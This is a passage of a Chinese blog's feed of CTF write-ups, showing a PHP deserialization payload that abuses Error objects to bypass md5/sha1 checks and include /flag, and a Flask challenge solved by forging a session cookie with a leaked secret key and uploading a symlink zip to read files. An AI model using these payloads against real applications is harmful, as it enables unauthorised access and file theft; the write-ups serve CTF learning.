number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PwnThyBytes-2019-Baby-SQL&quot;&gt;&lt;a href=&quot;#PwnThyBytes-2019-Baby-SQL&quot; class=&quot;headerlink&quot; title=&quot;[PwnThyBytes 2019]Baby_SQL&quot;&gt;&lt;/a&gt;[PwnThyByt</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="sqli" scheme="http://lll-nnn.github.io/categories/CTF/sqli/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="sqli" scheme="http://lll-nnn.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>BSidesCF 2020 Hurdles</title>
    <link href="http://lll-nnn.github.io/2021/09/10/BUU94/"/>
    <id>http://lll-nnn.github.io/2021/09/10/BUU94/</id>
    <published>2021-09-10T15:01:36.000Z</published>
    <updated>2021-09-10T15:03:58.085Z</updated>
    
    <content type="html"><![CDATA[<p>真就假猪套天下第一呗，这么多层</p><p><a href="https://blog.csdn.net/cjdgg/article/details/119881039">https://blog.csdn.net/cjdgg/article/details/119881039</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;真就假猪套天下第一呗，这么多层&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/cjdgg/article/details/119881039&quot;&gt;https://blog.csdn.net/cjdgg/article/details/119881</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="假猪套" scheme="http://lll-nnn.github.io/categories/CTF/%E5%81%87%E7%8C%AA%E5%A5%97/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="假猪套" scheme="http://lll-nnn.github.io/tags/%E5%81%87%E7%8C%AA%E5%A5%97/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 2020 Greatphp</title>
    <link href="http://lll-nnn.github.io/2021/09/07/BUU93/"/>
    <id>http://lll-nnn.github.io/2021/09/07/BUU93/</id>
    <published>2021-09-07T14:01:28.000Z</published>
    <updated>2021-09-07T14:38:38.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>给了源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>                   <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><ul><li>利用Error原生类绕过<code>md5</code>和<code>sha1</code>      </li></ul><p>本地测试</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"llnn"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"llnn"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"a!=b"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"md5 success"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"sha1 success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>测试结果<br><code>$a = new Error(&quot;llnn&quot;,1);</code>和<code>$b = new Error(&quot;llnn&quot;,2);</code>不在一行的话<code>md5</code>和<code>sha1</code>是不等的 </p><p><img src="https://s3.bmp.ovh/imgs/2021/09/565130a04e84fd98.png">      </p><p>而且<code>llnn</code>那里，也就是Error类的第一个参数是可控的，所以可以这样：<code>?&gt;&lt;?=phpinfo();?&gt;</code>但有过滤，小括号和<code>/</code>都不能用，可以直接<code>include /flag</code>;将<code>/flag</code>url编码取反绕过</p><pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);%D0%99%93%9E%98php &gt; echo ~urldecode(&#39;%D0%99%93%9E%98&#39;);/flag</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"?>&lt;?=include~"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"%D0%99%93%9E%98"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"?>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SYCLOVER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;极客大挑战-2020-Greatphp&quot;&gt;&lt;a href=&quot;#极客大挑战-2020-Greatphp&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2020]Greatphp&quot;&gt;&lt;/a&gt;[极客大挑战 2020]Greatphp&lt;/h2&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019 Web3</title>
    <link href="http://lll-nnn.github.io/2021/09/05/BUU92/"/>
    <id>http://lll-nnn.github.io/2021/09/05/BUU92/</id>
    <published>2021-09-05T14:54:41.000Z</published>
    <updated>2021-09-07T14:06:45.647Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>打开环境<br><img src="https://s3.bmp.ovh/imgs/2021/09/30ed24f91e126fbf.png"><br>随便登个admin  admin<br><img src="https://s3.bmp.ovh/imgs/2021/09/e5c98883e53ffd6e.png"><br>点击<code>upload</code>会得到<code>Permission denied!</code><br>注意到网站标题是<code>CTF-Flask-Demo</code>,所以去解一下session<br>解密脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># flask-session-cookie-manager-master  也能解session</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>之后伪造cookie,让id为<code>b&#39;1&#39;</code>,需要key</p><p>然后，如果访问网站不存在的路由会返回<code>404 not found</code>但status是200，在响应头里有：<code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>base64解码后得到：<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code>    </p><p>然后用<code>flask-session-cookie-manager</code>加密即可</p><pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre><p><code>/upload</code>页面更换cookie</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a488570f16605e2e.png">    </p><p>得到文件上传的页面，且注释中有源码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/"</span>        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename        pathname <span class="token operator">=</span> path<span class="token operator">+</span>filename        <span class="token keyword">if</span> <span class="token string">"zip"</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> <span class="token string">"unzip -n -d "</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span> pathname            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>waf<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'not login'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>            <span class="token keyword">return</span> resp        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"can't give you"</span></code></pre><p>两个路由，第一个要求上传个图片压缩包，第二个说明flag在flask根目录下的flag里的flag.jpg中</p><p><code>showflag()</code>路由的<code>True==False</code>是恒<code>False</code>的，所以不能通过第二个路由拿到flag，这里通过第一个路由上传个软链接读取文件      </p><p><code>ln -s</code>是Linux的一种软连接，相当于Windows的快捷方式<br>比如</p><pre><code>┌──(root💀kali)-[~/桌面]└─# ln -s /etc/passwd test       </code></pre><p>打开<code>test</code>中就是<code>/etc/passwd</code>中的内容了        </p><p><code>/proc/self</code> 记录了系统运行的信息状态等,<code>cwd</code>指向当前进程运行目录的一个符号链接,即flask运行进程目录      </p><p>payload:   </p><pre><code>┌──(root💀kali)-[~]└─# ln -s /proc/self/cwd/flag/flag.jpg test┌──(root💀kali)-[~]└─# zip -ry test.zip test</code></pre><p>然后将<code>test.zip</code>上传即可得到flag<br><img src="https://s3.bmp.ovh/imgs/2021/09/f2435ead4e20cf6f.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SWPU2019-Web3&quot;&gt;&lt;a href=&quot;#SWPU2019-Web3&quot; class=&quot;headerlink&quot; title=&quot;[SWPU2019]Web3&quot;&gt;&lt;/a&gt;[SWPU2019]Web3&lt;/h2&gt;&lt;p&gt;打开环境&lt;br&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
